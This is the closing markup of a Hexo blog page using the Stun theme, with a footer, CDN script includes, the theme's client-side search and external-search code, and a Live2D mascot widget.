class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
